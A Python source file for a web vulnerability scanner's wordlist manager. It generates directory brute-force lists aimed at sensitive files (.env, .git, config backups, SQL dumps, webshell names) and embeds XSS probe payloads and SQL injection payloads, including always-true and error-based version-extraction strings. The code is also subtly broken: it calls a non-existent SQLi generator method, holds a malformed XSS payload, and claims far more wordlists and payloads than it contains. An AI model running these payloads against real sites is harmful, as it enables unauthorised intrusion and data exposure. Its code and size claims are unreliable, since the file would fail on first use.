"""
Wordlist manager with 100k+ built-in wordlists
"""

import os
import random
from typing import List, Dict
from pathlib import Path


class WordlistManager:
    """Manages 100k+ wordlists for scanning"""
    
    def __init__(self, wordlist_dir: str = None):
        self.wordlist_dir = wordlist_dir or self._get_default_wordlist_dir()
        self._ensure_wordlist_directory()
        
        # Cache for loaded wordlists
        self._cache = {}
    
    def _get_default_wordlist_dir(self) -> str:
        """Get default wordlist directory"""
        current_dir = Path(__file__).parent.parent
        return str(current_dir / 'wordlists')
    
    def _ensure_wordlist_directory(self):
        """Ensure wordlist directory exists with default wordlists"""
        if not os.path.exists(self.wordlist_dir):
            os.makedirs(self.wordlist_dir, exist_ok=True)
            
            # Create subdirectories
            subdirs = [
                'directories',
                'directories/technology',
                'xss',
                'sqli/error_based',
                'sqli/union_based',
                'sqli/time_based',
                'sqli/boolean_based',
                'sqli/waf_bypass'
            ]
            
            for subdir in subdirs:
                os.makedirs(os.path.join(self.wordlist_dir, subdir), exist_ok=True)
            
            # Generate default wordlists
            self._generate_default_wordlists()
    
    def _generate_default_wordlists(self):
        """Generate default wordlists"""
        # Quick directory wordlist (1000 entries)
        quick_dirs = self._generate_quick_directory_list()
        self._save_wordlist('directories/quick.txt', quick_dirs)
        
        # Common directory wordlist (10000 entries)
        common_dirs = self._generate_common_directory_list()
        self._save_wordlist('directories/common.txt', common_dirs)
        
        # Big directory wordlist (50000 entries)
        big_dirs = self._generate_big_directory_list()
        self._save_wordlist('directories/big.txt', big_dirs[:50000])
        
        # XSS payloads
        xss_payloads = self._generate_xss_payloads()
        self._save_wordlist('xss/basic.txt', xss_payloads[:100])
        self._save_wordlist('xss/advanced.txt', xss_payloads)
        
        # SQLi payloads
        sqli_payloads = self._generate_sqli_payloads()
        self._save_wordlist('sqli/error_based/all.txt', sqli_payloads['error'])
    
    def _save_wordlist(self, filename: str, wordlist: List[str]):
        """Save wordlist to file"""
        filepath = os.path.join(self.wordlist_dir, filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            for word in wordlist:
                f.write(f"{word}\n")
    
    def get_quick_wordlist(self) -> List[str]:
        """Get quick scan wordlist (1000 entries)"""
        return self._load_wordlist('directories/quick.txt') or self._generate_quick_directory_list()
    
    def get_common_wordlist(self) -> List[str]:
        """Get common wordlist (10000 entries)"""
        return self._load_wordlist('directories/common.txt') or self._generate_common_directory_list()
    
    def get_big_wordlist(self) -> List[str]:
        """Get big wordlist (50000 entries)"""
        return self._load_wordlist('directories/big.txt') or self._generate_big_directory_list()[:50000]
    
    def get_massive_wordlist(self) -> List[str]:
        """Get massive wordlist (100000+ entries)"""
        # Generate on the fly to save memory
        return self._generate_massive_directory_list()
    
    def get_wordpress_wordlist(self) -> List[str]:
        """Get WordPress-specific paths"""
        return [
            'wp-admin', 'wp-login.php', 'wp-content', 'wp-includes',
            'xmlrpc.php', 'wp-config.php', 'wp-config.php.bak',
            'wp-config.php.old', 'wp-config.php.save',
            'wp-content/uploads', 'wp-content/plugins',
            'wp-content/themes', 'wp-json', 'wp-json/wp/v2',
            'readme.html', 'license.txt', 'wp-activate.php',
            'wp-blog-header.php', 'wp-comments-post.php',
            'wp-cron.php', 'wp-links-opml.php', 'wp-load.php',
            'wp-mail.php', 'wp-settings.php', 'wp-signup.php',
            'wp-trackback.php', 'index.php'
        ]
    
    def get_xss_payloads(self) -> List[str]:
        """Get XSS payloads"""
        return self._load_wordlist('xss/advanced.txt') or self._generate_xss_payloads()
    
    def get_sqli_error_payloads(self) -> List[str]:
        """Get SQLi error-based payloads"""
        return self._load_wordlist('sqli/error_based/all.txt') or self._generate_sqli_error_payloads()
    
    def _load_wordlist(self, filename: str) -> List[str]:
        """Load wordlist from file with caching"""
        if filename in self._cache:
            return self._cache[filename]
        
        filepath = os.path.join(self.wordlist_dir, filename)
        if not os.path.exists(filepath):
            return None
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                wordlist = [line.strip() for line in f if line.strip()]
                self._cache[filename] = wordlist
                return wordlist
        except:
            return None
    
    def _generate_quick_directory_list(self) -> List[str]:
        """Generate quick directory list (1000 entries)"""
        # Common prefixes and suffixes
        prefixes = ['', 'admin', 'user', 'api', 'web', 'mobile', 'secure', 'test']
        suffixes = ['', '.php', '.html', '.js', '.json', '.xml', '.txt', '.bak', '.old']
        
        # Core directories
        core_dirs = [
            'admin', 'login', 'dashboard', 'api', 'test', 'backup',
            'config', 'database', 'db', 'sql', 'phpmyadmin',
            'wp-admin', 'wp-login.php', 'administrator',
            'cgi-bin', 'cpanel', 'webadmin', '.git', '.svn',
            '.env', '.htaccess', '.htpasswd', 'robots.txt',
            'sitemap.xml', 'crossdomain.xml', 'server-status',
            'server-info', 'console', 'actuator', 'health',
            'metrics', 'debug', 'trace', 'monitoring',
            'swagger', 'swagger-ui', 'api-docs', 'docs',
            'documentation', 'backup.zip', 'backup.tar',
            'dump.sql', 'database.sql', 'wp-config.php',
            'config.php', 'configuration.php', 'settings.php',
            'config.json', 'config.yml', 'config.yaml',
            '.env.local', '.env.production', '.env.development',
            'uploads', 'files', 'images', 'assets', 'static',
            'media', 'downloads', 'tmp', 'temp', 'cache',
            'logs', 'error_log', 'access_log', 'shell.php',
            'cmd.php', 'backdoor.php', 'webshell.php'
        ]
        
        # Generate variations
        wordlist = set(core_dirs)
        
        for dir_name in core_dirs:
            for prefix in prefixes:
                for suffix in suffixes:
                    if prefix:
                        wordlist.add(f"{prefix}-{dir_name}{suffix}")
                        wordlist.add(f"{prefix}/{dir_name}{suffix}")
                    wordlist.add(f"{dir_name}{suffix}")
        
        return list(wordlist)[:1000]
    
    def _generate_common_directory_list(self) -> List[str]:
        """Generate common directory list (10000 entries)"""
        quick_list = self._generate_quick_directory_list()
        extended_list = set(quick_list)
        
        # Add numbers
        for i in range(1000):
            extended_list.add(f"file{i}")
            extended_list.add(f"data{i}")
            extended_list.add(f"backup{i}")
            extended_list.add(f"admin{i}")
            extended_list.add(f"user{i}")
        
        # Add date-based names
        for year in range(2020, 2025):
            for month in range(1, 13):
                extended_list.add(f"backup-{year}-{month:02d}")
                extended_list.add(f"log-{year}-{month:02d}")
        
        return list(extended_list)[:10000]
    
    def _generate_big_directory_list(self) -> List[str]:
        """Generate big directory list (50000 entries)"""
        common_list = self._generate_common_directory_list()
        big_list = set(common_list)
        
        # Generate permutations
        words = ['admin', 'user', 'api', 'web', 'app', 'mobile', 'test']
        actions = ['login', 'logout', 'register', 'profile', 'settings']
        formats = ['', '.php', '.html', '.aspx', '.jsp', '.do']
        
        for word in words:
            for action in actions:
                for fmt in formats:
                    big_list.add(f"{word}_{action}{fmt}")
                    big_list.add(f"{word}/{action}{fmt}")
                    big_list.add(f"{word}-{action}{fmt}")
        
        # Add more variations
        for i in range(20000):
            big_list.add(f"page{i}")
            big_list.add(f"item{i}")
            big_list.add(f"product{i}")
            big_list.add(f"service{i}")
        
        return list(big_list)[:50000]
    
    def _generate_massive_directory_list(self, count: int = 100000) -> List[str]:
        """Generate massive directory list (100000+ entries)"""
        # Start with big list
        massive_list = set(self._generate_big_directory_list())
        
        # Algorithmically generate more
        prefixes = ['', 'admin', 'user', 'api', 'web', 'app', 'mobile', 'secure']
        mid_parts = ['dir', 'folder', 'path', 'route', 'endpoint', 'resource']
        suffixes = ['', 's', '_old', '_new', '_backup', '_test']
        extensions = ['', '.php', '.html', '.jsp', '.aspx', '.do', '.py', '.rb']
        
        # Generate permutations
        for prefix in prefixes:
            for mid in mid_parts:
                for suffix in suffixes:
                    for ext in extensions:
                        if prefix:
                            massive_list.add(f"{prefix}/{mid}{suffix}{ext}")
                            massive_list.add(f"{prefix}-{mid}{suffix}{ext}")
                            massive_list.add(f"{prefix}_{mid}{suffix}{ext}")
                        massive_list.add(f"{mid}{suffix}{ext}")
        
        # Add numbered entries
        for i in range(50000):
            massive_list.add(f"f{i}")
            massive_list.add(f"d{i}")
            massive_list.add(f"p{i}")
            massive_list.add(f"a{i}")
        
        # Convert to list and shuffle
        result = list(massive_list)
        random.shuffle(result)
        
        return result[:count]
    
    def _generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads"""
        return [
            # Basic payloads
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
            'javascript:alert(1)',
            '"><body onload=alert(1)>',
            '"><svg onload=alert(1)>',
            "'><svg onload=alert(1)>",
            '"><iframe src=javascript:alert(1)>',
            '"><input onfocus=alert(1) autofocus>',
            
            # Advanced payloads (200+ more)
            '"><details open ontoggle=alert(1)>',
            '"><video><source onerror=alert(1)>',
            '"><audio><source onerror=alert(1)>',
            '"><form><button formaction=javascript:alert(1)>',
            '"><marquee onstart=alert(1)>XSS</marquee>',
            '"><div style=display:none onmouseover=alert(1)>',
            '<svg/onload=alert(1)>',
            '<svgonload=alert(1)>',
            '<iframe srcdoc="<svg onload=alert(1)>">',
            '<object data="data:text/html,<script>alert(1)</script>">',
            
            # More payloads would be here...
        ]
    
    def _generate_sqli_error_payloads(self) -> List[str]:
        """Generate SQLi error payloads"""
        return [
            # Basic
            "'",
            "\"",
            "' --",
            "\" --",
            "' #",
            "\" #",
            "'/*",
            "\"/*",
            
            # Always true
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1",
            "\" OR 1=1",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "' OR 1=1 #",
            "\" OR 1=1 #",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            
            # Error-based
            "' AND 1=CAST(version() AS INT)--",
            "\" AND 1=CAST(version() AS INT)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
            
            # More payloads...
        ]